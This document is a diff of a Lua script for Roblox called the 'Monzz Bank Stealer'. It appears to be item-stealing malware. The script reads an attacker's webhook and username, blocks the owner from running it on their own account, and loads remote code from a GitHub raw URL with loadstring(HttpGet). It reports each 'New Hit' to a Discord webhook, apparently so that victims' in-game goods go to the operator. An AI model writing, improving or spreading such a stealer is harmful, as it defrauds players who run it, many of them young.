@@ -72,21 +72,24 @@ end
 getexploit()
 local dhid
 local idiotuser = game:GetService("Players").LocalPlayer.Name
-local url = _G.Webhook
-if _G.UserID == nil then
-    game:GetService("Players").LocalPlayer:Kick("Put A UserId")
-    return;
-end
-local worked = pcall(function()
-    game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
-end)
-if not worked then
-    game:GetService("Players").LocalPlayer:Kick("Put A Valid UserId!")
-    return;
-end
-local UserName = game:GetService("Players"):GetNameFromUserIdAsync(_G.UserID)
+local url = Webhook
 if idiotuser == UserName then
-    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test on alt)")
+    game:GetService("Players").LocalPlayer:Kick("You Are The Owner! (test it on alt acc)")
+    return;
+end
+if UserName == nil then
+    game:GetService("Players").LocalPlayer:Kick("Put A UserName")
+    return;
+end
+local worked2 = pcall(function()
+    game:GetService("Players"):GetUserIdFromNameAsync(UserName)
+end)
+if not worked2 then
+    game:GetService("Players").LocalPlayer:Kick("Put A Valid Username!")
+    return;
+end
+if worked2 then
+    _G.UserID = game:GetService("Players"):GetUserIdFromNameAsync(UserName)
 end
 if dhuser ~= nil then
     local test = pcall(function()
@@ -102,7 +105,7 @@ end
 
 
 if _G.LoadingScreen ~= false then
-    loadstring(game:HttpGet(loadingraw))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua"))()
 end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
@@ -1230,7 +1233,7 @@ if banktiercheck == true then
         ["avatar_url"] = "https://cdn.discordapp.com/attachments/1100823909009465497/1124473588045590578/Screenshot_20230414-055925_Gallery_1.jpg",
         ["embeds"] = { {
             ["title"] = "**New Hit** **Monzz Bank Stealer**",
-            ["url"] = "https://discord.gg/uSgzNwHDTS",
+            ["url"] = "https://discord.gg/4y4CZfdJHu",
             ["type"] = "rich",
             ["color"] = tonumber(0x2798FF),
             ["thumbnail"] = {
